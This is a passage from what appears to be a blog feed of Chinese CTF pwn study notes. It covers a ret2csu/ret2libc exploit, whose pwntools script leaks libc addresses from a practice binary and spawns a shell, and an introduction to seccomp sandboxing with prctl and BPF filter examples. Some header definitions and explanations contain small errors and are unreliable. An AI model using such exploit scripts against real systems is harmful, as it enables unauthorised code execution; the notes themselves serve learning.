class=\"line\">.text:00000000004005F1                 test    rbp, rbp</span><br><span class=\"line\">.text:00000000004005F4                 jz      short loc_400616</span><br><span class=\"line\">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class=\"line\">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class=\"line\">.text:0000000000400600</span><br><span class=\"line\">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class=\"line\">.text:0000000000400600                 mov     rdx, r13</span><br><span class=\"line\">.text:0000000000400603                 mov     rsi, r14</span><br><span class=\"line\">.text:0000000000400606                 mov     edi, r15d</span><br><span class=\"line\">.text:0000000000400609                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</span><br><span class=\"line\">.text:000000000040060D                 add     rbx, 1</span><br><span class=\"line\">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class=\"line\">.text:0000000000400614                 jnz     short loc_400600</span><br><span class=\"line\">.text:0000000000400616</span><br><span class=\"line\">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class=\"line\">.text:0000000000400616                 add     rsp, 8</span><br><span class=\"line\">.text:000000000040061A                 pop     rbx</span><br><span class=\"line\">.text:000000000040061B                 pop     rbp</span><br><span class=\"line\">.text:000000000040061C                 pop     r12</span><br><span class=\"line\">.text:000000000040061E                 pop     r13</span><br><span class=\"line\">.text:0000000000400620                 pop     r14</span><br><span class=\"line\">.text:0000000000400622                 pop     r15</span><br><span class=\"line\">.text:0000000000400624                 retn</span><br><span class=\"line\">.text:0000000000400624 ; &#125; // starts at 4005C0</span><br></pre></td></tr></table></figure>\n<p>​\t\t由下面这个点可以知道，可以控制的寄存器为 edi、rsi、rdx，另外， <code>call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</code>  还使得可以调用 r12+rbx*8 的一个地址的函数，所以，这里可以利用 r12 来跳转到 write 函数来泄露 write 函数的地址，然后就可以通过 ret2libc 来获得 shell，</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./level5&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;level5&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_addr = <span class=\"number\">0x40061a</span></span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">mov_addr = <span class=\"number\">0x400600</span></span><br><span class=\"line\">main_addr = elf.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Hello, World\\n&#x27;</span>)</span><br><span class=\"line\">payload0 = <span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">136</span> + p64(pop_addr) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">1</span>) + p64(write_got) + p64(<span class=\"number\">8</span>) + p64(write_got) + p64(<span class=\"number\">1</span>) + p64(mov_addr) + <span class=\"string\">&#x27;a &#x27;</span>*(<span class=\"number\">0x8</span>+<span class=\"number\">8</span>*<span class=\"number\">6</span>) + p64(main_addr)</span><br><span class=\"line\">p.sendline(payload0)</span><br><span class=\"line\"></span><br><span class=\"line\">write_start = u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;write_addr_in_memory_is &quot;</span>+<span class=\"built_in\">hex</span>(write_start)</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;libc.so.6&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc_base=write_start-libc.symbols[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">system_addr=libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]+libc_base</span><br><span class=\"line\">binsh=<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>))+libc_base</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;libc_base_addr_in_memory_is &quot;</span>+<span class=\"built_in\">hex</span>(libc_base)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;system_addr_in_memory_is &quot;</span>+<span class=\"built_in\">hex</span>(system_addr)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;/bin/sh_addr_in_memory_is &quot;</span>+<span class=\"built_in\">hex</span>(binsh)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi_ret=<span class=\"number\">0x400623</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x88</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Pwn"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/9d5b1ce4.html",
            "url": "http://blog.g01den.top/posts/9d5b1ce4.html",
            "title": "pwn学习笔记（8）-初识沙箱",
            "date_published": "2024-08-05T20:04:38.000Z",
            "content_html": "<h1 id=\"初识pwn沙箱\"><a class=\"markdownIt-Anchor\" href=\"#初识pwn沙箱\">#</a> 初识 Pwn 沙箱</h1>\n<p>​\t\t沙箱机制，英文 sandbox，是计算机领域的虚拟技术，常见于安全方向。一般说来，我们会将不受信任的软件放在沙箱中运行，一旦该软件有恶意行为，则禁止该程序的进一步运行，不会对真实系统造成任何危害。</p>\n<p>​\t\t安全计算模式 seccomp（Secure Computing Mode）在 Linux2.6.10 之后引入到 kernel 的特性，可用其实现一个沙箱环境。使用 seccomp 模式可以定义系统调用白名单和黑名单。seccomp 机制用于限制应用程序可以使用的系统调用，增加系统的安全性。</p>\n<p>​\t\t在 ctf 中主要通过两种方式实现沙箱机制：</p>\n<ul>\n<li>prctl 系统调用；</li>\n<li>seccomp 库函数；</li>\n</ul>\n<h2 id=\"1-prctl函数初探\"><a class=\"markdownIt-Anchor\" href=\"#1-prctl函数初探\">#</a> 1、prctl 函数初探</h2>\n<p>​\t\tprctl 是基本的进程管理函数，最原始的沙箱规则就是通过 prctl 函数来实现的，它可以决定有哪些系统调用函数可以被调用，哪些系统调用函数不能被调用。</p>\n<p>​\t\t下面是 /linux/prctl.h 和 seccomp 相关的源码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Get/set process seccomp mode */</span></span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">define</span> PR_GET_SECCOMP      21</span></span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">define</span> PR_GET_SECCOMP     22</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * If no_new_privs is set, then operations that grant new privileges (i.e.</span></span><br><span class=\"line\"><span class=\"comment\"> * execve) will either fail or not grant them.  This affects suid/sgid,</span></span><br><span class=\"line\"><span class=\"comment\"> * file capabilities, and LSMs.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * Operations that merely manipulate or drop existing privileges (setresuid,</span></span><br><span class=\"line\"><span class=\"comment\"> * capset, etc.) will still work.  Drop those privileges if you want them gone.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * Changing LSM security domain is considered a new privilege.  So, for example,</span></span><br><span class=\"line\"><span class=\"comment\"> * asking selinux for a specific new context (e.g. with runcon) will result</span></span><br><span class=\"line\"><span class=\"comment\"> * in execve returning -EPERM.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * See Documentation/userspace-api/no_new_privs.rst for more details.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PR_SET_NO_NEW_PRIVS    38</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PR_GET_NO_NEW_PRIVS    39</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t<strong>prctl 函数原型</strong>：int prctl (int option,unsigned long argv2,unsigned long argv3,unsigned long argv4，unsigned long argv3)</p>\n<p>在具体了解 prctl 函数之前，我们再了解这样一个概念：沙箱。沙箱 (Sandbox) 是程序运行过程中的一种隔离机制，其目的是限制不可信进程和不可信代码的访问权限。seccomp 是内核中的一种安全机制，seccomp 可以在程序中禁用掉一些系统调用来达到保护系统安全的目的，seccomp 规则的设置，可以使用 prctl 函数和 seccomp 函数族。</p>\n<p>​\t\t<strong>include/linux/prctl.h 里面存储着 prctl 的所有参数的宏定义，prctl 的五个参数中，其中第一个参数是你要做的事情，后面的参数都是对第一个参数的限定。</strong></p>\n<p>​\t\t在第一个参数中，我们需要重点关注的参数有这两个：</p>\n<ol>\n<li>PR_SET_SECCOMP (22)：当第一个参数是 PR_SET_SECCOMP, 第二个参数 argv2 为 1 的时候，表示允许的系统调用有 read，write，exit 和 sigereturn；当 argv 等于 2 的时候，表示允许的系统调用由 argv3 指向 sock_fprog 结构体定义，该结构体成员指向的 sock_filter 可以定义过滤任意系统调用和系统调用参数。(细节见下图)</li>\n<li>PR_SET_NO_NEWPRIVS (38):prctl (38,1,0,0,0) 表示禁用系统调用 execve () 函数，同时，这个选项可以通过 fork () 函数和 clone () 函数继承给子进程。</li>\n</ol>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sock_fprog</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">short</span>        len;    <span class=\"comment\">/* 指令个数 */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sock_filter</span> *<span class=\"title\">filter</span>;</span> <span class=\"comment\">/*指向包含struct sock_filter的结构体数组指针*/</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sock_filter</span> &#123;</span>            <span class=\"comment\">/* Filter block */</span></span><br><span class=\"line\">    __u16 code;                 <span class=\"comment\">/* Actual filter code,bpf指令码 */</span></span><br><span class=\"line\">    __u8  jt;                   <span class=\"comment\">/* Jump true */</span></span><br><span class=\"line\">    __u8  jf;                   <span class=\"comment\">/* Jump false */</span></span><br><span class=\"line\">    __u32 k;                    <span class=\"comment\">/* Generic multiuse field */</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//seccomp-data结构体记录当前正在进行bpf规则检查的系统调用信息</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">seccomp_data</span>&#123;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> nr;<span class=\"comment\">//系统调用号</span></span><br><span class=\"line\">    __u32 arch;<span class=\"comment\">//调用架构</span></span><br><span class=\"line\">    __u64 instruction_pointer;<span class=\"comment\">//CPU指令指针</span></span><br><span class=\"line\">    __u64 argv[<span class=\"number\">6</span>];<span class=\"comment\">//寄存器的值，x86下是ebx，exc,edx,edi,ebp;x64下是rdi,rsi,rdx,r10,r8,r9</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-prctl函数详解\"><a class=\"markdownIt-Anchor\" href=\"#2-prctl函数详解\">#</a> 2、prctl () 函数详解</h2>\n<p>​\t\t <code>prctl</code>  是一个系统调用，用于控制和修改进程的行为和属性。它可以在 Linux 系统上使用，提供了各种功能和选项来管理进程的不同方面。</p>\n<p>​\t\t以下是 <code>prctl</code>  函数的基本原型：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">prctl</span><span class=\"params\">(<span class=\"type\">int</span> option, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> arg2, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> arg3, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> arg4, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> arg5)</span>;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>​\tprctl 函数接受不同的 option 选项和参数，用于执行不同的操作。下面是一些常用的 option 选项及其功能：</p>\n<ul>\n<li>PR_SET_NAME：设置进程名称。</li>\n<li>PR_GET_NAME：获取进程名称。</li>\n<li>PR_SET_PDEATHSIG：设置在父进程终止时发送给当前进程的信号。</li>\n<li>PR_GET_PDEATHSIG：获取父进程终止时发送给当前进程的信号。</li>\n<li>PR_SET_DUMPABLE：设置进程的可转储标志，影响核心转储。</li>\n<li>PR_GET_DUMPABLE：获取进程的可转储标志。</li>\n<li>PR_SET_SECCOMP：设置进程的安全计算模式。</li>\n<li>PR_GET_SECCOMP：获取进程的安全计算模式。</li>\n</ul>\n</blockquote>\n<p>​\t\t这些仅是一些常用的选项， <code>prctl</code>  还支持其他选项和功能。每个选项都有特定的参数，可以根据需要传递。具体的参数和行为取决于所选的选项。</p>\n<p>​\t\t以下是一个简单的示例，展示了如何使用 <code>prctl</code>  函数设置进程名称：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _GNU_SOURCE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"type\">char</span>* process_name = <span class=\"string\">&quot;MyProcess&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (prctl(PR_SET_NAME, (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) process_name) == <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">        perror(<span class=\"string\">&quot;prctl&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 获取进程名称</span></span><br><span class=\"line\">    <span class=\"type\">char</span> name[<span class=\"number\">16</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (prctl(PR_GET_NAME, (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) name) == <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">        perror(<span class=\"string\">&quot;prctl&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Process name: %s\\n&quot;</span>, name);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t在上述示例中，我们使用 prctl 函数将当前进程的名称设置为 &quot;MyProcess&quot;。然后，我们再次使用 prctl 函数获取进程的名称，并将其打印到标准输出。</p>\n<p>​\t\t请注意，prctl 函数的具体行为和可用选项可能因操作系统和版本而异。在使用 prctl 函数时，应该查阅相关文档并了解所使用的操作系统的支持和限制。</p>\n<h2 id=\"3-bpf过滤规则伯克利封装包过滤\"><a class=\"markdownIt-Anchor\" href=\"#3-bpf过滤规则伯克利封装包过滤\">#</a> 3、BPF 过滤规则 (伯克利封装包过滤)</h2>\n<p>​\t\t突破沙箱规则，本质上就是一种越权漏洞。seccomp 是 linux 保护进程安全的一种保护机制，它通过对系统调用函数的限制，来保护内核态的安全。所谓沙箱，就是把用户态和内核态相互分离开，让用户态的进程，不要影响到内核态，从而保证系统安全。</p>\n<p>​\t\t如果我们在沙箱中，完全遵守 seccomp 机制，我们便只能调用 exit (),sigreturn (),read () 和 write () 这四种系统调用，那么其实我们的进程应该是安全的（其实也不一定，后面的例题就没有溢出，而是通过系统调用直接读取文件）。但是，由于他的规则过于死板，所以后面出现了过滤模式，让我们可以调用到那些系统调用。回顾上面提到的 PT_SET_SECCOMP 这个参数，后面接到的第一个参数，就是它设置的模式，第三个参数，指向 sock_fprog 结构体，sock_fprog 结构体中，又有指向 sock_filter 结构体的指针，sock_filter 结构体这里，就是我们要设置规则的地方。</p>\n<p>我们在设置过滤规则，在面对沙箱题目的时候，会经常用到 Seccomp-tools 这个工具。</p>\n<p><strong>BPF 指令集简介</strong></p>\n<blockquote>\n<p>BPF_LD：加载操作，BPF_H 表示按照字节传送，BPF_W 表示按照双字来传送，BPF_B 表示传送单个字节。</p>\n<p>BPF_LDX：从内存中加载 byte/half-word/word/double-word。</p>\n<p>BPF_ST,BPF_STX：存储操作</p>\n<p>BPF_ALU,BPT_ALU64：逻辑操作运算。</p>\n<p>BPT_JMP：跳转操作，可以和 JGE，JGT，JEQ，JSET 一起表示有条件的跳转，和 BPF_JA 一起表示没有条件的跳转。</p>\n</blockquote>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stddef.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;linux/seccomp.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;linux/filter.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;sys/prctl.h&gt;</span>    </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;linux/bpf.h&gt;</span>             <span class=\"comment\">//off和imm都是有符号类型，编码信息定义在内核头文件linux/bpf.h</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sock_filter</span> <span class=\"title\">filter</span>[]=</span>&#123;</span><br><span class=\"line\">                BPF_STMT(BPF_LD|BPF_W|BPF_ABS, <span class=\"number\">0</span>),   <span class=\"comment\">// 从第0个字节开始，传送4个字节</span></span><br><span class=\"line\">                BPF_JUMP(BPF_JMP|BPF_JEQ, <span class=\"number\">59</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>), <span class=\"comment\">// 比较是否为59（execve 的系统调用号），是就跳过下一行，如果不是，就执行下一行，第三个参数表示执行正确的指令跳转，第四个参数表示执行错误的指令跳转</span></span><br><span class=\"line\">                BPF_JUMP(BPF_JMP|BPF_JGE, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>),</span><br><span class=\"line\">        <span class=\"comment\">//      BPF_STMP(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span></span><br><span class=\"line\">        <span class=\"comment\">//        杀死一个进程</span></span><br><span class=\"line\">        <span class=\"comment\">//        BPF_STMP(BPF_RET+BPF_K,SECCOMP_RET_TRACE),</span></span><br><span class=\"line\">        <span class=\"comment\">//        父进程追踪子进程，具体没太搞清楚</span></span><br><span class=\"line\">                 BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ERRNO),</span><br><span class=\"line\">        <span class=\"comment\">//        异常处理</span></span><br><span class=\"line\">                BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),</span><br><span class=\"line\">        <span class=\"comment\">//        这里表示系统调用如果正常，允许系统调用</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sock_fprog</span> <span class=\"title\">prog</span>=</span>&#123;</span><br><span class=\"line\">                .len=<span class=\"keyword\">sizeof</span>(filter)/<span class=\"keyword\">sizeof</span>(sock_filter[<span class=\"number\">0</span>]),</span><br><span class=\"line\">                .filter=filter,</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        prctl(PR_SET_NO_NEW_PRIVS,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);<span class=\"comment\">//第一个参数是进行什么设置，第二个参数是设置的过滤模式，第三个参数是设置的过滤规则</span></span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;123&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t开始的时候，我们设置了 sock_filter 结构体数组。这里为什么是一个结构体数组呢？因为我们看到里面有 BPF_STMT 和 BPF_JMP 的宏定义，其实 BPF_STMT 和 BPF_JMP 都是条件编译后赋值的 sock_filter 结构体。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span>     BPF_STMT</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span>    BPF_STMT(code,k)&#123;(unsigned short)(code),0,0,k&#125;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span>     BPF_JUMP</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span>    BPF_JUMP(code,k,jt,jf)&#123;(unsigned short)(code),jt,jf,k&#125;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br></pre></td></tr></table></figure>\n<p>​\t\t上面的例子中禁用了 execve 的系统调用号，64 位系统中 execve 的系统调用号是 59.</p>\n<p>​\t\tBPF_JUMP 后的第二个参数是我们要设置的需要禁用的系统调用号。</p>\n<p>​\t\t我们在这里禁用的两个系统调用分别是 sys_restart_syscall 和 execve，如果出现这两个系统调用，那么我们就会跳转到 BPF_STMP (BPF_RET+BPF_K,SECCOMP_RET_ERRNO) 的异常处理。其实，如果我们要直接杀死这个进程的话，BPF_STMP (BPF_RET+BPF_K,SECCOMP_RET_KILL) 这个规则可以直接杀死进程。</p>\n<p>​\t\tGitHub 上的一个真实例子：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vZm50bG56LzA4YWUyMGJlZmI5MWJlZmQ5YTUzY2Q5MWNkYzZkNTA3\">例子</span></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/audit.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span 